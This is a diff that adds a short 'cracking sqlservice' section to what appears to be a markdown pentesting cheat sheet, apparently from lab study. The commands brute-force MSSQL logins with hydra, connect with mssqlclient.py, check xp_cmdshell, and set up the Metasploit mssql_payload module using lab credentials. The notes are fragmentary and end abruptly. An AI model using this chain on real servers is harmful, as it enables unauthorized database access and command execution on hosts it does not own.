@@ -2574,3 +2574,28 @@ sudo systemctl start docker
 :~$ nslookup -type=ns domain_name
 ```
 </details>
+<details>
+<summary>cracking sqlservice</summary>
+
+```console
+:~$ find for 1433 sql service in subnet
+brute force using hydra 
+mssql://ip
+and then
+```
+```
+python3 mssqlclient.py username:password@ip
+```
+now we have to check for payload to insert  
+```
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
+```
+if it returns 1
+```
+ use exploit/windows/mssql/mssql_payload
+set RHOST 10.10.1.30
+set USERNAME SQL_srv
+set PASSWORD batman
+set DATABASE master
+Users/Public/Downloads
+```
